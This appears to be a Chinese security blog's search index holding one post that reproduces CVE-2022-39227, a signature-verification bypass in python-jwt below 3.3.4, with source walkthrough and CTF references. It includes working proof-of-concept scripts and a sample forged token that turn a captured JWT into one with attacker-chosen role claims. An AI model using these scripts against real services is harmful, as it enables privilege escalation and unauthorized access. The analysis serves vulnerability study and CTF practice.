<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python-JWT身份验证绕过复现(CVE-2022-39227)</title>
    <url>/2024/01/03/Python-JWT%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87(CVE-2022-39227)/</url>
    <content><![CDATA[<h4 id="介绍">介绍:</h4>
<p>python-jwt库中的verify_jwt()存在身份验证绕过漏洞</p>
<h4 id="版本">版本:</h4>
<p>python-jwt &lt; 3.3.4</p>
<h4 id="漏洞分析">漏洞分析:</h4>
<p>环境搭建:pip install python-jwt == 3.3.3</p>
<p>以 以下的复现代码为例分析漏洞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jwcrypto <span class="keyword">import</span> jwk</span><br><span class="line"></span><br><span class="line"><span class="comment">#jwt载荷主体</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;role&#x27;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line"><span class="comment">#256位密钥生成</span></span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;oct&#x27;</span>, size=<span class="number">256</span>)</span><br><span class="line"><span class="comment">#生成jwt以HS256加密签名</span></span><br><span class="line">jwt_json = generate_jwt(payload, key, <span class="string">&#x27;HS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line"><span class="comment">###以下部分为payload生成###</span></span><br><span class="line">[header, payload, signature] = jwt_json.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment">#把python数组转化为json数据,并base64加密</span></span><br><span class="line">fake = base64url_encode(dumps(parsed_payload))</span><br><span class="line"><span class="comment">#构造一个绕过的json形式的payload,这是关键下面会分析</span></span><br><span class="line">fake_jwt = <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fake_jwt)</span><br><span class="line">token = verify_jwt(fake_jwt, key, [<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line"><span class="comment">#成功绕过打印结果</span></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401031115828.png" alt="imgs/202401031115828.png"></p>
<h5 id="1-进入验证返回函数verify-jwt">1.进入验证返回函数verify_jwt</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_jwt</span>(<span class="params">jwt,</span></span><br><span class="line"><span class="params">               pub_key=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">               allowed_algs=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">               iat_skew=timedelta(<span class="params"></span>),</span></span><br><span class="line"><span class="params">               checks_optional=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">               ignore_not_implemented=<span class="literal">False</span></span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> allowed_algs <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        allowed_algs = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(allowed_algs, <span class="built_in">list</span>):</span><br><span class="line">        <span class="comment"># jwcrypto only supports list of allowed algorithms</span></span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;allowed_algs must be a list&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    header, claims, _ = jwt.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parsed_header = json_decode(base64url_decode(header))</span><br><span class="line"></span><br><span class="line">    alg = parsed_header.get(<span class="string">&#x27;alg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> alg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;alg header not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> alg <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;algorithm not allowed: &#x27;</span> + alg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ignore_not_implemented:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> parsed_header:</span><br><span class="line">            <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> JWSHeaderRegistry:</span><br><span class="line">                <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;unknown header: &#x27;</span> + k)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> JWSHeaderRegistry[k].supported:</span><br><span class="line">                <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;header not implemented: &#x27;</span> + k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pub_key:</span><br><span class="line">        token = JWS()</span><br><span class="line">        token.allowed_algs = allowed_algs</span><br><span class="line">        token.deserialize(jwt, pub_key)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;none&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;no key but none alg not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parsed_claims = json_decode(base64url_decode(claims))</span><br><span class="line"></span><br><span class="line">    utcnow = datetime.utcnow()</span><br><span class="line">    now = timegm(utcnow.utctimetuple())</span><br><span class="line"></span><br><span class="line">    typ = parsed_header.get(<span class="string">&#x27;typ&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> typ != <span class="string">&#x27;JWT&#x27;</span>:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header is not JWT&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    iat = parsed_claims.get(<span class="string">&#x27;iat&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> iat <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;iat claim not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> iat &gt; timegm((utcnow + iat_skew).utctimetuple()):</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;issued in the future&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    nbf = parsed_claims.get(<span class="string">&#x27;nbf&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> nbf <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;nbf claim not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> nbf &gt; now:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;not yet valid&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    exp = parsed_claims.get(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> exp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;exp claim not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> exp &lt;= now:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;expired&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parsed_header, parsed_claims</span><br></pre></td></tr></table></figure>
<p>逐段对函数verify_jwt()进行分析</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先验证传入的allowed_algs(指定的签名验证算法)是否合规</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#传入的allowed_algs校验</span></span><br><span class="line"><span class="keyword">if</span> allowed_algs <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    allowed_algs = []</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(allowed_algs, <span class="built_in">list</span>):</span><br><span class="line">    <span class="comment"># jwcrypto only supports list of allowed algorithms</span></span><br><span class="line">    <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;allowed_algs must be a list&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>接着将传入的要验证的jwt根据.号分为三段分别存储,并将第一段header通过base64解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将传入的jwt分为三段</span></span><br><span class="line">header, claims, _ = jwt.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_header = json_decode(base64url_decode(header))</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>接着验证header中存储相关信息是否合规(alg指定的签名验证算法是否和allowed_algs中指定的是否一致等)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#header头合规验证</span></span><br><span class="line">alg = parsed_header.get(<span class="string">&#x27;alg&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> alg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;alg header not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> alg <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;algorithm not allowed: &#x27;</span> + alg)</span><br><span class="line">  </span><br><span class="line"> <span class="keyword">if</span> <span class="keyword">not</span> ignore_not_implemented:</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> parsed_header:</span><br><span class="line">         <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> JWSHeaderRegistry:</span><br><span class="line">             <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;unknown header: &#x27;</span> + k)</span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> JWSHeaderRegistry[k].supported:</span><br><span class="line">             <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;header not implemented: &#x27;</span> + k)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p><mark>接着对签名进行验证</mark></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#token.deserialize进行签名验证</span></span><br><span class="line"><span class="keyword">if</span> pub_key:</span><br><span class="line">       token = JWS()</span><br><span class="line">       token.allowed_algs = allowed_algs</span><br><span class="line">       token.deserialize(jwt, pub_key)</span><br><span class="line">   <span class="keyword">elif</span> <span class="string">&#x27;none&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">       <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;no key but none alg not allowed&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>如果签名验证成功无错误返回,则将jwt载荷(payload)解码传给parsed_claims(后续会将parsed_claims返回作为得到的成功验证的信息)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parsed_claims = json_decode(base64url_decode(claims))</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>对jwt载荷中的其他信息进行判断(如是否超过jwt有效时间等)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utcnow = datetime.utcnow()</span><br><span class="line"> now = timegm(utcnow.utctimetuple())</span><br><span class="line">  </span><br><span class="line"> typ = parsed_header.get(<span class="string">&#x27;typ&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> typ != <span class="string">&#x27;JWT&#x27;</span>:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header is not JWT&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"> iat = parsed_claims.get(<span class="string">&#x27;iat&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> iat <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;iat claim not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> iat &gt; timegm((utcnow + iat_skew).utctimetuple()):</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;issued in the future&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"> nbf = parsed_claims.get(<span class="string">&#x27;nbf&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> nbf <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;nbf claim not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> nbf &gt; now:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;not yet valid&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"> exp = parsed_claims.get(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> exp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;exp claim not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> exp &lt;= now:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;expired&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>最后返回成功结果:解码过的jwt header和jwt 载荷(payload)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> parsed_header, parsed_claims</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="2-token-deserialize-方法分析">2.token.deserialize()方法分析</h5>
<p>对于一个传入的jwt,我们要使其通过验证,必须要使token.deserialize()验证通过。我们来看token.deserialize()的验证过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>(<span class="params">self, raw_jws, key=<span class="literal">None</span>, alg=<span class="literal">None</span></span>):</span><br><span class="line">       self.objects = &#123;&#125;</span><br><span class="line">       o = &#123;&#125;</span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               djws = json_decode(raw_jws)</span><br><span class="line">               <span class="keyword">if</span> <span class="string">&#x27;signatures&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">                   o[<span class="string">&#x27;signatures&#x27;</span>] = []</span><br><span class="line">                   <span class="keyword">for</span> s <span class="keyword">in</span> djws[<span class="string">&#x27;signatures&#x27;</span>]:</span><br><span class="line">                       os = self._deserialize_signature(s)</span><br><span class="line">                       o[<span class="string">&#x27;signatures&#x27;</span>].append(os)</span><br><span class="line">                       self._deserialize_b64(o, os.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   o = self._deserialize_signature(djws)</span><br><span class="line">                   self._deserialize_b64(o, o.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> <span class="string">&#x27;payload&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">                   <span class="keyword">if</span> o.get(<span class="string">&#x27;b64&#x27;</span>, <span class="literal">True</span>):</span><br><span class="line">                       o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(djws[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">                   <span class="keyword">else</span>:</span><br><span class="line">                       o[<span class="string">&#x27;payload&#x27;</span>] = djws[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line"></span><br><span class="line">           <span class="keyword">except</span> ValueError:</span><br><span class="line">               c = raw_jws.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">               <span class="keyword">if</span> <span class="built_in">len</span>(c) != <span class="number">3</span>:</span><br><span class="line">                   <span class="keyword">raise</span> InvalidJWSObject(<span class="string">&#x27;Unrecognized&#x27;</span></span><br><span class="line">                                          <span class="string">&#x27; representation&#x27;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">               p = base64url_decode(<span class="built_in">str</span>(c[<span class="number">0</span>]))</span><br><span class="line">               <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="number">0</span>:</span><br><span class="line">                   o[<span class="string">&#x27;protected&#x27;</span>] = p.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                   self._deserialize_b64(o, o[<span class="string">&#x27;protected&#x27;</span>])</span><br><span class="line">               o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">1</span>]))</span><br><span class="line">               o[<span class="string">&#x27;signature&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">           self.objects = o</span><br><span class="line"></span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  <span class="comment"># pylint: disable=broad-except</span></span><br><span class="line">           <span class="keyword">raise</span> InvalidJWSObject(<span class="string">&#x27;Invalid format&#x27;</span>) <span class="keyword">from</span> e</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> key:</span><br><span class="line">           self.verify(key, alg)</span><br></pre></td></tr></table></figure>
<p>逐段分析代码</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先通过json_decode()方法对传入的raw_jws分别分为是json数据和不是json数据分别处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    djws = json_decode(raw_jws)</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
<p>注意:我们可以看到这里通过try… except ValueError对数据进行分流处理,如果传入的不是json数据就会通过except ValueError下的语句处理</p>
</li>
<li class="lvl-2">
<p>第一种不是json数据的处理流程</p>
<p>将raw_jws根据.分段,如果分段数不为3段则报错(也就是不是正常的jwt形式)</p>
<p>然后将raw_jwt的三段数据(也就是头部,载荷,签证三部分)赋给数组o</p>
<p>再将数组o赋给self.objects</p>
<p>通过self.verify(key, alg)验证签证正确性key指的是加密密钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        c = raw_jws.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(c) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">raise</span> InvalidJWSObject(<span class="string">&#x27;Unrecognized&#x27;</span></span><br><span class="line">                                   <span class="string">&#x27; representation&#x27;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">        p = base64url_decode(<span class="built_in">str</span>(c[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="number">0</span>:</span><br><span class="line">            o[<span class="string">&#x27;protected&#x27;</span>] = p.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            self._deserialize_b64(o, o[<span class="string">&#x27;protected&#x27;</span>])</span><br><span class="line">        o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">1</span>]))</span><br><span class="line">        o[<span class="string">&#x27;signature&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">2</span>]))</span><br><span class="line">  </span><br><span class="line">    self.objects = o</span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">if</span> key:</span><br><span class="line">    self.verify(key, alg)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>第二种json数据的处理流程</p>
<p>与第一种类似不过这次不用通过raw_jws.split(‘.’)分割,直接根据索引赋值头部,载荷,签证三部分给数组o</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        djws = json_decode(raw_jws)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;signatures&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">            o[<span class="string">&#x27;signatures&#x27;</span>] = []</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> djws[<span class="string">&#x27;signatures&#x27;</span>]:</span><br><span class="line">                os = self._deserialize_signature(s)</span><br><span class="line">                o[<span class="string">&#x27;signatures&#x27;</span>].append(os)</span><br><span class="line">                self._deserialize_b64(o, os.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            o = self._deserialize_signature(djws)</span><br><span class="line">            self._deserialize_b64(o, o.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;payload&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">            <span class="keyword">if</span> o.get(<span class="string">&#x27;b64&#x27;</span>, <span class="literal">True</span>):</span><br><span class="line">                o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(djws[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                o[<span class="string">&#x27;payload&#x27;</span>] = djws[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">if</span> key:</span><br><span class="line">    self.verify(key, alg)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="3-最终利用">3.最终利用</h5>
<p>事实上verify_jwt()中将jwt根据.号划分成三段的做法 和 token.deserialize()方法的第二种处理jwt的方式结合会出现身份验证绕过漏洞</p>
<p>思路如下:</p>
<ol>
<li class="lvl-3">
<p>传入一个json形式的数据,根据正确的jwt伪造protected、payload、signatures键值对,从而成功通过token.deserialize()对签名正确的验证</p>
</li>
<li class="lvl-3">
<p>再创造一个键值对,键名为我们自定义伪造的jwt,因为verify_jwt()中将jwt根据.号划分成三段的粗暴做法</p>
<p>我们可以使得最终通过<code>return parsed_header, parsed_claims</code>返回的结果为我们想要的</p>
</li>
</ol>
<p>复现代码中生成的payload就是这种形式的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_jwt = <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fake_jwt)</span><br></pre></td></tr></table></figure>
<p>print(fake_jwt)输出类似为以下形式</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiAxNzAwMDYxNTgzLCAiaWF0IjogMTcwMDA1Nzk4MywgImp0aSI6ICJPdjYwNzVlaTZiS3BVVnE0YzE0b3F3IiwgIm5iZiI6IDE3MDAwNTc5ODMsICJyb2xlIjogImkgYW0gbm90IGd1ZXN0In0.&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;protected&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span><span class="punctuation">,</span> </span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJleHAiOjE3MDAwNjE1ODMsImlhdCI6MTcwMDA1Nzk4MywianRpIjoiT3Y2MDc1ZWk2YktwVVZxNGMxNG9xdyIsIm5iZiI6MTcwMDA1Nzk4Mywicm9sZSI6Imd1ZXN0In0&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span><span class="string">&quot;1cdkqIg3xvum-VlPBYG4V38o9zJsfBlCAoTjRRSqz0Q&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改以下复现代码可以得到通用的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jwcrypto <span class="keyword">import</span> jwk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jwt_json = <span class="string">&quot;获取到的jwt&quot;</span></span><br><span class="line">[header, payload, signature] = jwt_json.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_payload = loads(base64url_decode(payload))</span><br><span class="line"><span class="comment">#这里键值对根据需要修改</span></span><br><span class="line">parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;i am not guest&quot;</span></span><br><span class="line">fake = base64url_encode(dumps(parsed_payload))</span><br><span class="line">fake_jwt = <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fake_jwt)</span><br></pre></td></tr></table></figure>
<h5 id="一个小细节">一个小细节:</h5>
<p>上面说到</p>
<p>创造一个键值对,键名为我们自定义伪造的jwt,verify_jwt()会将jwt根据.号划分成三段,再将第一段和第二段分别通过base64url_decode()解码赋给parsed_header和 parsed_claims返回。</p>
<p>而我们构造的出来的payload的第一段是含有<code>&#123;“</code>,那么解析不会出错吗</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401012029071.png" alt="image-20231115223308809"></p>
<p>事实上这是没问题的我们看一下关于base64url_decode()的介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64url_decode()是一个用于解码Base64 URL安全编码的函数。</span><br><span class="line">Base64 URL安全编码将标准的Base64编码进行了一些修改，以便在URL中传输时不会产生冲突。</span><br><span class="line">具体而言，它使用&quot;-“替换”+“，使用”_“替换”/“，并且将结尾的”=&quot;去除，并且会忽略掉不是base64的字符。</span><br></pre></td></tr></table></figure>
<p>显然<code>&#123;”</code>不是base64字符base64url_decode()会自动将其去掉</p>
<h4 id="相关题目">相关题目:</h4>
<h5 id="1-Newstar2023-Week5-Ye’s-Pickle">1.Newstar2023 Week5  Ye’s Pickle</h5>
<h5 id="2-2022祥云杯-FunWEB">2.2022祥云杯 FunWEB</h5>
]]></content>
      <categories>
        <category>CVE复现</category>
      </categories>
      <tags>
        <tag>CVE复现</tag>
        <tag>python</tag>
      </tags>
  </entry>
</search>
